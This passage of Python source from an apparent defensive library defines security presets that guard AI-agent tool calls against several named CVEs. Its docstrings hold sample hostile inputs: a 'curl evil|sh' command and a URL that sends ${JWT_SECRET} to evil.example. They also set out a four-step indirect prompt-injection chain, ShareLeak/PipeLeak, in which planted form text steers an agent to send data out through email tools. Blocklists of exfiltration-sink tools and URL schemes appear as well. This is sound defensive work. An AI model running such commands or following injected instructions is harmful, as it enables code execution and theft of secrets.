        - ``guard`` — a pre-built
          :class:`StdioCommandInjectionGuard` ready to ``evaluate(args)``.
        - ``check`` — convenience callable; ``check(args)`` raises
          :class:`FlowiseMcpStdioInjectionError` on a denied argv shape
          and returns ``None`` on a benign one.
        - ``tool_name_patterns`` — the Flowise-stdio tool surface this
          preset scopes to.
        - ``owasp`` — ``"MCP05"``.
        - ``cves`` — ``("CVE-2026-40933",)``.
        - ``advisory_url`` — primary GitLab advisory.
        - ``composes`` — the underlying primitive preset.

    Usage::

        from agent_airlock.policy_presets import flowise_mcp_stdio_guard_2026_defaults

        guard = flowise_mcp_stdio_guard_2026_defaults()
        guard["check"]({"command": "uvx", "args": ["mcp-server-foo"]})   # ok
        guard["check"]({"command": "sh -c 'curl evil|sh'"})              # raises

    Primary source:
      https://advisories.gitlab.com/npm/flowise-components/CVE-2026-40933/
    """
    from .mcp_spec.stdio_command_injection_guard import StdioCommandInjectionGuard

    if not isinstance(cwd_allowlist, tuple):
        raise TypeError(
            f"cwd_allowlist must be a tuple[str, ...]; got {type(cwd_allowlist).__name__}"
        )
    if not isinstance(extra_metachars, frozenset):
        raise TypeError(
            f"extra_metachars must be a frozenset[str]; got {type(extra_metachars).__name__}"
        )
    if not isinstance(extra_tool_name_patterns, tuple):
        raise TypeError(
            "extra_tool_name_patterns must be a tuple of str; got "
            f"{type(extra_tool_name_patterns).__name__}"
        )

    guard = StdioCommandInjectionGuard(
        cwd_allowlist=cwd_allowlist,
        extra_metachars=extra_metachars,
    )

    def _check(args: dict[str, Any] | None) -> None:
        """Raise :class:`FlowiseMcpStdioInjectionError` on a denied argv shape."""
        decision = guard.evaluate(args)
        if not decision.allowed:
            raise FlowiseMcpStdioInjectionError(
                (
                    f"Flowise MCP-stdio adapter command blocked "
                    f"(CVE-2026-40933): {decision.detail}. "
                    "See https://advisories.gitlab.com/npm/flowise-components/CVE-2026-40933/"
                ),
                verdict=decision.verdict.value,
                matched_metachar=decision.matched_metachar,
                matched_path=decision.matched_path,
            )

    return {
        "preset_id": "flowise_mcp_stdio_guard_2026",
        "severity": "critical",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "tool_name_patterns": (_FLOWISE_MCP_STDIO_TOOL_NAME_PATTERNS + extra_tool_name_patterns),
        "owasp": "MCP05",
        "cves": ("CVE-2026-40933",),
        "advisory_url": "https://advisories.gitlab.com/npm/flowise-components/CVE-2026-40933/",
        "composes": ("mcp_stdio_command_injection_preset_defaults",),
    }


def semantic_kernel_filter_eval_rce_2026_25592_26030_defaults(
    *,
    suspect_fields: frozenset[str] | None = None,
    scan_all_fields: bool = False,
) -> dict[str, Any]:
    """Recommended config for the Semantic-Kernel-class filter-eval RCE guard (v0.7.5+).

    Microsoft's 2026-05-07 MSRC blog disclosed two CVEs in the
    Semantic Kernel filter-evaluation pipeline:

    - **CVE-2026-25592** — lambda-filter eval RCE (Python lambda
      reaches a runtime ``compile()`` / ``eval()`` sink).
    - **CVE-2026-26030** — template-expression eval RCE (C#
      ``Expression.Lambda<>`` reaches a runtime expression
      evaluator).

    The exploit class is **not Semantic-Kernel-specific** — any
    framework that compiles user-controlled filter expressions is
    vulnerable. This preset wires
    :class:`agent_airlock.mcp_spec.filter_eval_rce_guard.FilterEvalRCEGuard`
    with a default vocabulary of suspect fields. ``scan_all_fields=True``
    is the operator-defensive mode that inspects every value on the
    payload regardless of field name.

    Primary source:
      https://www.microsoft.com/en-us/security/blog/2026/05/07/prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/
    """
    from .mcp_spec.filter_eval_rce_guard import DEFAULT_SUSPECT_FIELDS

    return {
        "preset_id": "semantic_kernel_filter_eval_rce_2026_25592_26030",
        "severity": "critical",
        "default_action": "deny",
        "advisory_url": (
            "https://www.microsoft.com/en-us/security/blog/2026/05/07/"
            "prompts-become-shells-rce-vulnerabilities-ai-agent-frameworks/"
        ),
        "cves": ("CVE-2026-25592", "CVE-2026-26030"),
        "suspect_fields": (
            suspect_fields if suspect_fields is not None else DEFAULT_SUSPECT_FIELDS
        ),
        "scan_all_fields": scan_all_fields,
    }


def managed_agents_outcomes_2026_05_06_defaults(
    *,
    allowlist: frozenset[str] = frozenset(),
    provenance_field: str | None = None,
) -> dict[str, Any]:
    """Recommended config for the Managed Agents Outcomes-rubric guard (v0.7.4+).

    Anthropic's 2026-05-06 SF Code event shipped Managed Agents with
    a structured **Outcomes** rubric (beta). The rubric produces a
    verdict identifier that downstream tool calls should carry as a
    provenance anchor. This preset wires the operator-supplied
    rubric-ID allowlist into a fail-closed gate via
    :class:`agent_airlock.integrations.managed_agents_outcomes_guard.ManagedAgentsOutcomesGuard`.

    Default ``allowlist=frozenset()`` denies all calls — operators
    must explicitly enrol the rubric IDs they trust.

    Honest scope: Managed Agents and Outcomes are beta. The rubric
    ID format and the field name carrying the anchor in tool-call
    payloads may shift between today (2026-05-06 anchor) and Q3 2026
    GA. The allowlist is a frozenset of strings (no regex), and the
    field name is operator-overridable.

    Primary sources:
      https://platform.claude.com/docs/en/managed-agents/dreams
      https://code.claude.com/docs/en/routines
    """
    from .integrations.managed_agents_outcomes_guard import (
        MANAGED_AGENTS_OUTCOMES_2026_05_06_DEFAULT_FIELD,
    )

    return {
        "preset_id": "managed_agents_outcomes_2026_05_06",
        "severity": "high",
        "default_action": "deny",
        "advisory_url": "https://platform.claude.com/docs/en/managed-agents/dreams",
        "allowlist": allowlist,
        "provenance_field": (
            provenance_field
            if provenance_field is not None
            else MANAGED_AGENTS_OUTCOMES_2026_05_06_DEFAULT_FIELD
        ),
    }


GTG_1002_DEFENSE = gtg_1002_defense_policy()
MEX_GOV_2026 = mex_gov_2026_policy()
OWASP_MCP_TOP_10_2026 = owasp_mcp_top_10_2026_policy()
EU_AI_ACT_ARTICLE_15 = eu_ai_act_article_15_policy()
INDIA_DPDP_2023 = india_dpdp_2023_policy()


# -----------------------------------------------------------------------------
# V0.8.7 — Per-model-tier cost budget preset
# -----------------------------------------------------------------------------


STRICT_MODEL_TIER_BUDGET = ModelTierBudget(
    tiers={
        "frontier": TierBudget(max_cost_cents=50, max_output_tokens=4000),
        "mid": TierBudget(max_cost_cents=10, max_output_tokens=2000),
        "small": TierBudget(max_cost_cents=2, max_output_tokens=1000),
    },
    strict_tier="small",
)
"""Conservative per-call budget split across three tiers (v0.8.7).

Caps per call:
- ``frontier`` — 50¢ / 4000 output tokens.
- ``mid``      — 10¢ / 2000 output tokens.
- ``small``    —  2¢ / 1000 output tokens.

Untagged calls fall back to ``small`` (deny-by-default — the cheapest tier).
Combine with :func:`strict_tier_budget_policy` for a ready-to-use policy,
or assemble your own :class:`~agent_airlock.policy.SecurityPolicy` with
``model_tier_budget=STRICT_MODEL_TIER_BUDGET``.
"""


def strict_tier_budget_policy(
    tier_resolver: Any | None = None,
) -> SecurityPolicy:
    """Return a SecurityPolicy seeded with :data:`STRICT_MODEL_TIER_BUDGET`.

    No allow/deny lists — this preset focuses on cost protection. Layer it
    on top of an existing policy (e.g. ``OWASP_MCP_TOP_10_2026``) by
    constructing a :class:`SecurityPolicy` directly with both
    ``allowed_tools`` and ``model_tier_budget`` set.

    Args:
        tier_resolver: Optional callback mapping model_id strings to tier
            labels. When supplied, untagged calls that ship a ``model_id``
            in ``context.metadata`` can be routed to the correct tier
            without an explicit ``_airlock_tier`` kwarg. The router stays
            in the caller's code — agent-airlock just invokes the callback.

    Returns:
        A fresh :class:`SecurityPolicy` instance with the strict budget.
    """
    budget = STRICT_MODEL_TIER_BUDGET
    if tier_resolver is not None:
        budget = ModelTierBudget(
            tiers=dict(STRICT_MODEL_TIER_BUDGET.tiers),
            strict_tier=STRICT_MODEL_TIER_BUDGET.strict_tier,
            tier_resolver=tier_resolver,
        )
    return SecurityPolicy(model_tier_budget=budget)


# -----------------------------------------------------------------------------
# V0.8.8 — CVE-2026-35394 Mobile MCP intent-URL RCE guard
# -----------------------------------------------------------------------------


class MobileMcpIntentBlocked(AirlockError):
    """Raised when a CVE-2026-35394 disallowed URL scheme is observed.

    Subclass of :class:`AirlockError` so callers can ``except AirlockError:``
    once across the agent-airlock surface. The preset's ``check_url``
    helper raises the underlying :class:`SafeURLValidationError` (which
    already carries ``url`` and ``reason``); this class exists for
    decorator-side wrapping that wants a typed "blocked by this CVE preset"
    distinction.
    """


# Schemes the Mobile MCP CVE-2026-35394 disclosure proves are
# weaponizable when forwarded to Android's intent system. The preset
# implements scheme-allowlisting (http + https only) — these names are
# documented for visibility, not used as a blocklist (allowlists are
# strictly safer).
_MOBILE_MCP_BLOCKED_SCHEMES: tuple[str, ...] = (
    "intent",  # Android intent: URI — the CVE's direct attack vector
    "content",  # content-provider access (file read, SMS, contacts)
    "file",  # local file disclosure
    "app",  # deep-link to arbitrary installed app
    "data",  # embedded payload (data:text/html,...)
    "javascript",  # XSS-class via WebView
    "vbscript",  # legacy IE — defense in depth
)


# Canonical tool names known to forward URLs to the Android intent system.
# The vulnerable upstream is Mobilenexthq Mobile MCP < 0.0.50; ``open_url``
# / ``mobile_launch_url`` are included for defensive coverage when callers
# rename or wrap the original tool.
_MOBILE_MCP_TOOL_NAMES: tuple[str, ...] = (
    "mobile_open_url",
    "open_url",
    "mobile_launch_url",
)


# Pre-configured validator. ``allowed_schemes=["http", "https"]`` is the
# entire fix — any other scheme is rejected at the validator boundary.
# Block private IPs and metadata endpoints as defense in depth so an
# allowlisted https URL still can't pivot to SSRF.
_MOBILE_MCP_INTENT_VALIDATOR = SafeURLValidator(
    allowed_schemes=["http", "https"],
    block_private_ips=True,
    block_metadata_urls=True,
)


def mobile_mcp_intent_guard_2026_05() -> dict[str, Any]:
    """Defensive bundle for CVE-2026-35394 (Mobile MCP intent-URL RCE).

    Mobilenexthq Mobile MCP releases prior to **0.0.50** ship a
    ``mobile_open_url`` tool that forwards user-supplied URLs to
    Android's intent system without any scheme validation. Attackers
    weaponize this by sending ``intent:``/``content:``/``app:`` URLs
    that fire arbitrary Android intents — USSD codes, phone calls,
    SMS sends, content-provider reads. The upstream fix is a scheme
    allowlist; this preset is the agent-airlock-side equivalent so
    callers don't have to wait for an upstream bump.

    The preset is **DIFF-COMPATIBLE** with the existing
    :class:`~agent_airlock.SafeURLValidator` (it reuses it directly,
    configured with ``allowed_schemes=["http", "https"]``) — no new
    validator is introduced. It also returns an
    :class:`~agent_airlock.AirlockConfig` with
    ``unknown_args=UnknownArgsMode.BLOCK`` so an attacker can't smuggle
    a hallucinated kwarg past the validator.

    Returns:
        ``dict[str, Any]`` with:

        - ``validator`` — the pre-configured :class:`SafeURLValidator`.
        - ``check_url`` — convenience callable; raises
          :class:`~agent_airlock.SafeURLValidationError` on a denied
          scheme / private IP / metadata host.
        - ``airlock_config`` — an :class:`AirlockConfig` with
          ``unknown_args=UnknownArgsMode.BLOCK``. Compose with your
          tool's existing policy by passing ``config=...`` to
          ``@Airlock``.
        - ``tool_names`` — canonical Mobile MCP tool names this preset
          targets.
        - ``blocked_schemes`` — documented list of schemes the
          allowlist denies (for telemetry / audit narrative).
        - ``source`` — SentinelOne CVE database link.

    Usage::

        from agent_airlock import Airlock
        from agent_airlock.policy_presets import mobile_mcp_intent_guard_2026_05

        guard = mobile_mcp_intent_guard_2026_05()

        @Airlock(config=guard["airlock_config"])
        def mobile_open_url(url: str) -> str:
            guard["check_url"](url)  # raises SafeURLValidationError on intent:
            return open_url_native(url)

    Primary source:
      https://www.sentinelone.com/vulnerability-database/cve-2026-35394/
    """
    from .config import AirlockConfig
    from .unknown_args import UnknownArgsMode

    return {
        "validator": _MOBILE_MCP_INTENT_VALIDATOR,
        "check_url": _MOBILE_MCP_INTENT_VALIDATOR,  # __call__ raises on denied scheme
        "airlock_config": AirlockConfig(unknown_args=UnknownArgsMode.BLOCK),
        "tool_names": _MOBILE_MCP_TOOL_NAMES,
        "blocked_schemes": _MOBILE_MCP_BLOCKED_SCHEMES,
        "source": "https://www.sentinelone.com/vulnerability-database/cve-2026-35394/",
    }


MOBILE_MCP_INTENT_GUARD_2026_05_DEFAULTS = mobile_mcp_intent_guard_2026_05()
"""Eagerly-constructed defaults for :func:`mobile_mcp_intent_guard_2026_05`.

Use the constant when you want a shared singleton (same ``validator``
across call sites); call the factory when you need a fresh
``AirlockConfig`` to mutate without aliasing.
"""


# -----------------------------------------------------------------------------
# Capsule Security: CVE-2026-21520 (ShareLeak / PipeLeak) — indirect prompt
# injection in Copilot Studio + Salesforce Agentforce (v0.8.14+).
# -----------------------------------------------------------------------------

# Canonical exfil-sink tool-name globs. These are the OUTBOUND channels an
# attacker reaches when ShareLeak / PipeLeak succeeds: Copilot Studio →
# Outlook ``send_email`` etc.; Agentforce → ``create_case`` /
# ``post_to_chatter`` / outbound ``email`` actions; generic agentic tools →
# ``share_*`` / ``export_*`` / ``post_to_*`` / ``webhook_*``. The list is
# intentionally broad — operators who run a tighter surface can override
# ``denied_tools`` on the factory call, but the deny-by-default posture
# means missing-an-exfil-tool fails CLOSED, not open.
_CAPSULE_INDIRECT_INJECTION_EXFIL_SINKS: tuple[str, ...] = (
    # Copilot Studio + Outlook surface
    "send_email",
    "send_mail",
    "outlook_*",
    "email_send",
    "smtp_*",
    # Salesforce Agentforce surface
    "create_case",
    "create_lead",
    "create_contact",
    "post_to_chatter",
    "salesforce_send_email",
    "send_message",
    # Generic exfil / sharing / webhook surface
    "share_*",
    "export_*",
    "post_to_*",
    "webhook_*",
    "publish_*",
    "upload_*",
    "external_*",
    "http_request",
    "http_post",
    "fetch_url",
)


# Canonical Capsule-disclosed tool-name corpus this preset targets.
_CAPSULE_INDIRECT_INJECTION_TOOL_CORPUS: tuple[str, ...] = (
    # ShareLeak: Copilot Studio agents triggered by SharePoint forms
    # querying SharePoint and exfiltrating via Outlook.
    "sharepoint_query",
    "sharepoint_search",
    "outlook_send_email",
    # PipeLeak: Salesforce Agentforce Web-to-Lead form vector with
    # outbound case / email channels.
    "agentforce_web_to_lead_handler",
    "agentforce_create_case",
    "agentforce_send_email",
)


def capsule_indirect_injection_cve_2026_21520_defaults(
    *,
    extra_denied_tools: tuple[str, ...] = (),
    allowed_tools: tuple[str, ...] = (),
) -> dict[str, Any]:
    """Defensive bundle for CVE-2026-21520 (ShareLeak) + PipeLeak.

    Capsule Security's January 2026 disclosure of two parallel
    indirect-prompt-injection vulnerabilities:

    - **ShareLeak** — `CVE-2026-21520`_ (CVSS v3.1 7.5 HIGH; CWE-77;
      Microsoft Copilot Studio; patched 2026-01-15, published
      2026-01-22). NVD verbatim: *"Exposure of Sensitive Information
      to an Unauthorized Actor in Copilot Studio allows a
      unauthenticated attacker to view sensitive information through
      network attack vector"*. Capsule's named scenario: untrusted
      SharePoint form fields are concatenated into the agent system
      prompt with no input sanitisation; the agent then queries
      SharePoint and exfiltrates via Outlook.
    - **PipeLeak** — Capsule's name for the parallel vulnerability in
      Salesforce Agentforce. No separate CVE in public NVD as of this
      writing; same architectural pattern targeting Web-to-Lead form
      inputs with outbound case / lead / email actions.

    Threat-shape — the architectural pattern Capsule documents:

    1. Attacker plants malicious instructions in an untrusted form
       (SharePoint form / Web-to-Lead form).
    2. Agent reads form data and concatenates it directly into its
       context window — no boundary between untrusted form content
       and the agent's own system instructions.
    3. Agent holds **simultaneous** access to (a) the untrusted form
       content and (b) outbound communication tools (Outlook send,
       Salesforce case / email).
    4. The injected instructions steer the agent to query a sensitive
       data source (SharePoint / Salesforce records) and exfiltrate
       via the outbound tool.

    Patching the prompt-injection input alone does not close the
    architectural gap — the same agent / sink / form pattern persists
    across re-architected prompts. The defence has to live at the
    *boundary* between untrusted context and privileged action.

    This preset is the boundary. It composes existing agent-airlock
    primitives — it does **not** invent a new validator:

    - :attr:`SecurityPolicy.default_deny` ``= True``. Empty
      ``allowed_tools`` means **nothing** is callable; deployments opt
      every tool in by name. Closes the "any tool the agent dreamed
      up is callable" path.
    - :attr:`SecurityPolicy.denied_tools` — the canonical exfil-sink
      glob set. Deny-by-default at the sink level, so even if an
      operator forgets to tighten ``allowed_tools``, the outbound
      channels stay closed.
    - :attr:`SecurityPolicy.reauth_on_untrusted_reinvocation` ``=
      True`` with ``untrusted_reinvocation_threshold=1``. The v0.8.6
      debate-amplification guard: any tool reinvocation within a
      context whose origin includes untrusted tool output requires a
      fresh ``authorize_once()`` grant on the
      :class:`AirlockContext`. Directly addresses the
      untrusted-content-reaches-privileged-action exfil pattern.
    - :class:`AirlockConfig` with
      ``unknown_args=UnknownArgsMode.BLOCK``. Closes the smuggle-a-
      hallucinated-arg-past-the-validator escape hatch the model uses
      when the indirect injection asks it to pass an undeclared
      ``to``/``recipient``/``url`` kwarg.

    Diff-compatibility — this preset is **opt-in only**:

    - The new factory is not added to any default priority chain.
      Callers that don't opt in see exactly v0.8.13 behavior.
    - The denied-list defaults are extendable via ``extra_denied_tools``
      so an operator with additional vendor-specific sinks
      (e.g. Slack webhooks, ServiceNow record updates) can extend
      without forking the preset.
    - ``allowed_tools`` defaults to ``()`` (deny-all) — operators name
      the *read-side* tools their agent legitimately uses. Without
      this opt-in step the preset would block the agent entirely; the
      design pairs with ``airlock-explain --unused-scopes`` (v0.8.13)
      so operators populate the allow-list from a real trace.

    Args:
        extra_denied_tools: Tool-name globs to deny on top of the
            canonical exfil-sink set. Vendor-specific sinks
            (e.g. ``"slack_webhook_*"``, ``"servicenow_create_*"``)
            go here.
        allowed_tools: Read-side tool-name globs the operator
            explicitly admits. **Empty = deny-all** (the strictest
            posture and the default). The operator is expected to
            populate this after reviewing their agent's actual
            read surface — e.g. via ``airlock-explain --unused-scopes``
            against a representative trace.

    Returns:
        ``dict[str, Any]`` with:

        - ``policy`` — the :class:`SecurityPolicy` carrying the
          deny-by-default + reauth-on-untrusted + denied-sinks posture.
        - ``airlock_config`` — an :class:`AirlockConfig` with
          ``unknown_args=UnknownArgsMode.BLOCK``.
        - ``denied_sinks`` — the canonical exfil-sink glob set used
          (for audit / telemetry narrative).
        - ``tool_corpus`` — the Capsule-disclosed tool-name corpus
          this preset targets (for documentation / regression-test
          fixture reuse).
        - ``source`` — primary NVD link.
        - ``capsule_disclosure`` — Capsule blog link covering the
          ShareLeak / PipeLeak architecture analysis.

    Usage::

        from agent_airlock import Airlock
        from agent_airlock.policy_presets import (
            capsule_indirect_injection_cve_2026_21520_defaults,
        )

        guard = capsule_indirect_injection_cve_2026_21520_defaults(
            # Read-side tools your Agentforce / Copilot Studio agent
            # legitimately needs. Anything not in this set is denied.
            allowed_tools=("sharepoint_query", "sharepoint_search"),
            # Vendor-specific exfil sinks not in the canonical set:
            extra_denied_tools=("slack_webhook_*", "datadog_log_*"),
        )

        @Airlock(policy=guard["policy"], config=guard["airlock_config"])
        def outlook_send_email(to: str, body: str) -> None:
            ...  # Will be DENIED at the policy layer.

    .. _CVE-2026-21520: https://nvd.nist.gov/vuln/detail/CVE-2026-21520
    """
    from .config import AirlockConfig
    from .unknown_args import UnknownArgsMode

    denied_tools = list(_CAPSULE_INDIRECT_INJECTION_EXFIL_SINKS) + list(extra_denied_tools)
    policy = SecurityPolicy(
        allowed_tools=list(allowed_tools),
        denied_tools=denied_tools,
        default_deny=True,
        reauth_on_untrusted_reinvocation=True,
        untrusted_reinvocation_threshold=1,
    )
    return {
        "policy": policy,
        "airlock_config": AirlockConfig(unknown_args=UnknownArgsMode.BLOCK),
        "denied_sinks": _CAPSULE_INDIRECT_INJECTION_EXFIL_SINKS,
        "tool_corpus": _CAPSULE_INDIRECT_INJECTION_TOOL_CORPUS,
        "source": "https://nvd.nist.gov/vuln/detail/CVE-2026-21520",
        "capsule_disclosure": (
            "https://www.capsulesecurity.io/blog-post/"
            "shareleak-taking-the-wheel-of-microsofts-copilot-studio-cve-2026-21520"
        ),
    }


CAPSULE_INDIRECT_INJECTION_CVE_2026_21520_DEFAULTS = (
    capsule_indirect_injection_cve_2026_21520_defaults()
)
"""Eagerly-constructed defaults for
:func:`capsule_indirect_injection_cve_2026_21520_defaults`.

Use the constant when you want the canonical deny-by-default posture
without per-operator extensions; call the factory when you need to
extend ``extra_denied_tools`` or admit read-side ``allowed_tools``.
"""


def mcp_description_manifest_guard_defaults(
    *,
    manifests: Iterable[Any],
    drift_mode: str = "strict",
) -> dict[str, Any]:
    """Recommended config for the v0.8.18 MCP description-vs-manifest guard.

    Wires
    :class:`agent_airlock.mcp_spec.description_manifest_guard.DescriptionManifestGuard`
    to the operator-supplied manifest registry at the configured drift
    mode. The guard asserts that each tool's **model-facing description**
    (declared input schema + advertised capability/security boundary)
    is internally consistent with the tool's **registered manifest** —
    *before* the tool is admitted — and fails closed on a mismatch per
    the deny-by-default posture.

    This composes **above** the existing ghost-arg stripping
    (``unknown_args``) and Pydantic strict type-validation
    (``validator``): those govern the observed call payload, while this
    preset adds the semantic *description-vs-declared-contract*
    assertion. It does not replace them.

    Anchor: the DCIChecker study (arXiv:2606.04769) measured
    **Description-Code Inconsistency** at **9.93% of 19,200 tool
    pairs across 2,214 MCP servers** — the description the model
    consumes does not match the tool's actual contract ~1 in 10 times.

    OWASP mapping: **MCP03 Tool Poisoning** (OWASP MCP Top-10 2026,
    beta) — the under-disclosed-side-effect direction. Composes cleanly
    with :func:`owasp_mcp_top_10_2026_policy`.

    Args:
        manifests: Iterable of
            :class:`agent_airlock.mcp_spec.description_manifest_guard.ToolManifest`
            — the authoritative registered contracts. The caller owns
            sourcing these (server ``tools/list``, a checked-in
            manifest, a reviewed catalogue); agent-airlock imports no
            MCP SDK.
        drift_mode: ``"strict"`` (default) / ``"warn"`` / ``"shadow"``.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity``
        / ``default_action`` / ``advisory_url`` keys, plus:

        - ``guard`` — a pre-built ``DescriptionManifestGuard`` ready to
          ``evaluate(description)``.
        - ``check`` — convenience callable; ``check(description)`` raises
          :class:`DescriptionManifestViolation` on an inconsistent
          description and returns ``None`` on a consistent one.
        - ``owasp`` — ``"MCP03"``.
        - ``drift_mode`` — echo of the configured mode.

    Raises:
        ValueError: ``drift_mode`` is unknown.

    Usage::

        from agent_airlock.policy_presets import mcp_description_manifest_guard_defaults
        from agent_airlock.mcp_spec.description_manifest_guard import (
            ToolManifest,
            ToolDescription,
        )

        preset = mcp_description_manifest_guard_defaults(
            manifests=[ToolManifest(name="read_file", declared_args={"path"})],
        )
        preset["check"](ToolDescription(name="read_file", described_args={"path"}))  # ok
        preset["check"](ToolDescription(name="read_file", described_args={"path", "url"}))  # raises

    Primary source:
      https://arxiv.org/abs/2606.04769
    """
    from .mcp_spec.description_manifest_guard import (
        DescriptionManifestGuard,
        DescriptionManifestViolation,
        ToolDescription,
    )

    if drift_mode not in ("strict", "warn", "shadow"):
        raise ValueError(f"drift_mode must be 'strict'|'warn'|'shadow'; got {drift_mode!r}")

    guard = DescriptionManifestGuard(manifests=manifests, drift_mode=drift_mode)

    def _check(description: ToolDescription) -> None:
        """Raise :class:`DescriptionManifestViolation` on an inconsistent description."""
        decision = guard.evaluate(description)
        if not decision.allowed:
            raise DescriptionManifestViolation(decision)

    return {
        "preset_id": "mcp_description_manifest_guard",
        "severity": "high",
        "default_action": "deny" if drift_mode == "strict" else "allow",
        "guard": guard,
        "check": _check,
        "owasp": "MCP03",
        "drift_mode": drift_mode,
        "advisory_url": "https://arxiv.org/abs/2606.04769",
    }


# Tool-name globs denied by the LeRobot deserialization preset. These are
# the wrapper-name shapes that route a network payload to a pickle/marshal
# sink. Deny-by-name complements the value-level content guard: a tool that
# never even surfaces its payload to the guard (e.g. it reads bytes off a
# socket itself) is still refused by name.
_LEROBOT_DESERIALIZATION_DENIED_TOOLS: tuple[str, ...] = (
    "*deserialize*",
    "*unpickle*",
    "*pickle_load*",
    "*pickle.loads*",
    "load_pickle*",
    "*from_pickle*",
    "*marshal_load*",
    "*dill_load*",
    "torch_load",
    "torch_load_*",
    "send_observations",
    "send_policy_instructions",
    "get_actions",
)


def lerobot_cve_2026_25874_defaults() -> SecurityPolicy:
    """Deny-by-default posture for the LeRobot pickle-deserialization RCE class.

    CVE-2026-25874 (CVSS 9.3): HuggingFace LeRobot's async-inference
    PolicyServer / robot-client call ``pickle.loads()`` on payloads
    received over an **unauthenticated, non-TLS** gRPC channel
    (``SendObservations`` / ``SendPolicyInstructions`` / ``GetActions``).
    An unauthenticated, network-reachable attacker reaches arbitrary OS
    command execution by sending a crafted pickle blob. LeRobot runs on
    GPU-backed inference hosts that are often privileged and on internal
    networks, so the blast radius is severe.

    What this preset does (three layers, all fail-closed):

    1. **Content gate on argument values.** Wires
       :class:`agent_airlock.safe_types.UnsafeDeserializationGuard` so any
       call argument carrying a pickle payload (raw ``0x80`` magic bytes,
       base64-encoded pickle, or a ``pickle.loads`` / ``marshal.loads`` /
       ``dill.loads`` / ``jsonpickle.decode`` marker token) is blocked at
       the ``@Airlock`` seam *before* the tool body runs. The block
       response carries a ``fix_hint`` naming **CVE-2026-25874**.
    2. **Deny-by-name.** Tool names matching the deserialize / unpickle /
       ``torch_load`` / gRPC-method globs in
       :data:`_LEROBOT_DESERIALIZATION_DENIED_TOOLS` are denied unless the
       operator explicitly re-admits them via ``allowed_tools``.
    3. **Network-airgap pairing.** ``require_authenticated_transport=True``
       — a serialized-object (``bytes``) argument is refused unless the
       call declares an authenticated **and** TLS transport in its
       ``transport`` metadata argument. This is the direct mitigation for
       the CVE's root cause: pickle over an unauthenticated, non-TLS
       channel.

    The guard is the reusable, CVE-agnostic primitive; this preset is the
    LeRobot-specific projection (no new detector invented). It composes
    cleanly above ghost-argument stripping + Pydantic strict
    type-validation, which govern argument *shape*; this preset governs
    argument *content*.

    Returns:
        A :class:`SecurityPolicy` with ``denied_tools`` globs and a wired
        ``deserialization_guard``. Pair it with ``@Airlock`` directly::

            from agent_airlock import Airlock
            from agent_airlock.policy_presets import lerobot_cve_2026_25874_defaults

            @Airlock(policy=lerobot_cve_2026_25874_defaults())
            def send_observations(payload: bytes, transport: dict) -> bytes:
                ...

    Primary sources (retrieved 2026-06-07):
      https://www.sentinelone.com/vulnerability-database/cve-2026-25874/
      https://labs.cloudsecurityalliance.org/research/csa-research-note-lerobot-cve-2026-25874-unauth-rce-20260429/
    """
    from .safe_types import UnsafeDeserializationGuard

    return SecurityPolicy(
        denied_tools=list(_LEROBOT_DESERIALIZATION_DENIED_TOOLS),
        deserialization_guard=UnsafeDeserializationGuard(
            require_authenticated_transport=True,
            advisory="CVE-2026-25874",
            advisory_url="https://www.sentinelone.com/vulnerability-database/cve-2026-25874/",
        ),
    )


LEROBOT_CVE_2026_25874_DEFAULTS = lerobot_cve_2026_25874_defaults()
"""Eagerly-constructed defaults for :func:`lerobot_cve_2026_25874_defaults`.

Use the constant for the canonical deny-by-default posture; call the
factory when you need a fresh, independently-mutable :class:`SecurityPolicy`
(e.g. to extend ``allowed_tools`` for a vetted read-side tool).
"""


def mcp_server_env_interpolation_guard_defaults(
    *,
    allowed_vars: Iterable[str] | None = None,
) -> dict[str, Any]:
    """Recommended config for the MCP server-config env-interpolation guard (v0.8.20+).

    CVE-2026-32625 (LibreChat ≤ 0.8.3, CVSS 9.6, CWE-200): the MCP
    integration expands ``${VAR}`` placeholders in a **user-supplied**
    MCP server URL against the host ``process.env`` during schema
    validation, so an authenticated user can exfiltrate server-side
    secrets (``JWT_SECRET`` / ``CREDS_KEY`` / ``MONGO_URI`` / ...) by
    embedding them in a URL that dials an attacker-controlled host.

    Wires
    :class:`agent_airlock.mcp_spec.env_interpolation_guard.MCPServerEnvInterpolationGuard`
    deny-by-default: any ``${VAR}`` / ``$VAR`` / ``%VAR%`` token in the
    connection URL / headers / args is refused unless the referenced
    variable is on ``allowed_vars`` (explicitly-declared non-secret
    variables). An empty allowlist denies every interpolation token.

    OWASP mapping: **MCP01 Token Mismanagement and Secret Exposure**
    (OWASP MCP Top-10). Composes with :func:`owasp_mcp_top_10_2026_policy`.

    Args:
        allowed_vars: Variable names permitted in an interpolation token
            (e.g. a non-secret ``REGION``). Empty / None (default) denies
            all interpolation.

    Returns:
        ``dict[str, Any]`` with the canonical ``preset_id`` / ``severity``
        / ``default_action`` / ``advisory_url`` / ``cves`` keys, plus:

        - ``guard`` — a pre-built ``MCPServerEnvInterpolationGuard`` ready
          to ``evaluate(config)``.
        - ``check`` — convenience callable; ``check(config)`` raises
          :class:`MCPServerEnvInterpolationError` on a denied config and
          returns ``None`` on a clean one.
        - ``owasp`` — ``"MCP01"``.

    Usage::

        from agent_airlock.policy_presets import mcp_server_env_interpolation_guard_defaults

        preset = mcp_server_env_interpolation_guard_defaults()
        preset["check"]("https://api.example.com/mcp")            # ok
        preset["check"]("https://evil.example/?t=${JWT_SECRET}")  # raises

    Primary source:
      https://github.com/danny-avila/LibreChat/security/advisories/GHSA-6vqg-rgpm-qvf9
    """
    from .mcp_spec.env_interpolation_guard import (
        MCPEnvInterpolationDecision,
        MCPServerEnvInterpolationError,
        MCPServerEnvInterpolationGuard,
    )

    advisory_url = (
        "https://github.com/danny-avila/LibreChat/security/advisories/GHSA-6vqg-rgpm-qvf9"
    )
    guard = MCPServerEnvInterpolationGuard(
        allowed_vars=allowed_vars,
        advisory="CVE-2026-32625",
        advisory_url=advisory_url,
    )

    def _check(config: Mapping[str, Any] | str | None) -> None:
        """Raise :class:`MCPServerEnvInterpolationError` on a denied config."""
        decision: MCPEnvInterpolationDecision = guard.evaluate(config)
        if not decision.allowed:
            raise MCPServerEnvInterpolationError(decision)

    return {
        "preset_id": "mcp_server_env_interpolation_guard",
        "severity": "critical",
        "default_action": "deny",
        "guard": guard,
        "check": _check,
        "owasp": "MCP01",
        "cves": ("CVE-2026-32625",),
        "advisory_url": advisory_url,
    }


def codegen_delimiter_injection_guard_defaults(
    *,
    allowed_literal_fields: Iterable[str] | None = None,
